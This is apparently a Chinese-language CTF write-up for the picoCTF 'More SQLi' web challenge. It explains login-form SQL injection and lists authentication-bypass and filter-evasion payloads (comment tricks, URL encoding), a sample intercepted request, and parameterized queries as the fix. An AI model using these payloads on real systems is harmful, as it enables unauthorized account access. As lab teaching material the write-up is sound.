# Web - picoCTF《More SQLi》题解

## 题目信息

- 类别：Web
- 难度：中等
- 题目类型：SQL 注入
- 核心考点：身份认证绕过、联合查询/布尔注入思路、过滤绕过意识

## 题目分析

这类题一般会给出一个登录页面，要求你“想办法登录成管理员”或者“获取隐藏信息”。从题名 `More SQLi` 来看，重点不在于发现 SQL 注入本身，而在于在**存在过滤或限制条件**时继续推进利用。

最常见的后端逻辑类似这样：

```sql
SELECT * FROM users
WHERE username = '$username' AND password = '$password';
```

如果后端把用户输入直接拼进 SQL 语句，那么我们就可以通过闭合引号、拼接逻辑条件等方式改变查询语义。

## 基本思路

第一步通常是验证注入点是否存在。比如在用户名或密码里尝试输入：

```sql
' OR '1'='1
```

如果页面行为发生明显变化，比如提示不同、登录成功或报错，就可以确认存在注入。

但中等难度题往往不会止步于最基础的万能密码。常见的增强点包括：

- 对空格做过滤
- 对关键字如 `union`、`select`、`or` 做大小写或黑名单限制
- 登录成功还需要命中特定用户，如 `admin`
- 报错信息被隐藏，只能盲注

## 解题思路

这题的核心目标通常是让查询结果中**第一条匹配记录变成管理员**，或者直接让 `WHERE` 条件恒真。

一个典型 payload 是：

```sql
admin' --
```

它的含义是把 SQL 改写成：

```sql
SELECT * FROM users
WHERE username = 'admin' -- ' AND password = '...';
```

这样密码判断部分会被注释掉，直接以 `admin` 身份登录。

如果注释符、空格或关键字被过滤，则需要做变形。例如：

```sql
admin'/*
```

或者利用 URL 编码、换行、括号、注释分隔关键字等方式绕过：

```sql
'/**/OR/**/1=1--
```

## 实战步骤

1. 打开登录页面，先用正常账号密码观察返回行为
2. 在用户名或密码处插入单引号 `'`，测试是否触发异常或页面变化
3. 尝试基础认证绕过 payload
4. 如果被过滤，则改用注释、大小写变形、URL 编码等方式绕过
5. 如果要定向登录管理员，优先构造 `admin' --`
6. 登录成功后查看页面、cookie、跳转路径或隐藏接口
7. 在管理员页面找到 flag

## 常见 Payload 示例

### 认证绕过

```sql
' OR 1=1 --
```

### 指定管理员

```sql
admin' --
```

### 过滤绕过

```sql
admin'/**/--
'/**/OR/**/1=1--
```

### URL 编码形式

```text
admin%27%20--%20
```

## Burp Suite 中的测试方式

可以把登录请求拦下来，在 `username` 和 `password` 参数里逐步替换 payload：

```http
POST /login HTTP/1.1
Host: challenge.example.com
Content-Type: application/x-www-form-urlencoded

username=admin%27%20--%20&password=test
```

如果返回包中出现登录成功、会话 cookie 或跳转到后台页面，就说明利用成功。

## 题目本质

这类题最核心的问题是：**服务端把不可信输入直接拼接进了 SQL 语句**。一旦攻击者控制了查询结构，认证逻辑就不再由程序控制，而是被攻击者接管。

正确的修复方式不是继续堆黑名单，而是：

- 使用参数化查询
- 不拼接原始 SQL
- 对认证逻辑做最小权限设计
- 对错误信息做合理隐藏，但不要把“隐藏报错”误当作安全措施

## 这题的关键坑点

- 不要只会一个万能密码 payload，要会变形
- 中等题经常限制空格和注释符，需要测试替代写法
- 登录成功后别忘了继续找 flag，很多题的 flag 不在登录响应里
- 如果页面没有明显报错，说明可能要走盲注思路

## 知识点总结

这题适合巩固以下内容：

- 登录框 SQL 注入的判断方法
- 认证绕过与管理员定向登录
- 基础过滤绕过技巧
- 参数化查询才是根本修复方案

一句话总结就是：

> **SQL 注入不只是“输个万能密码”，而是利用输入接管数据库查询逻辑。**
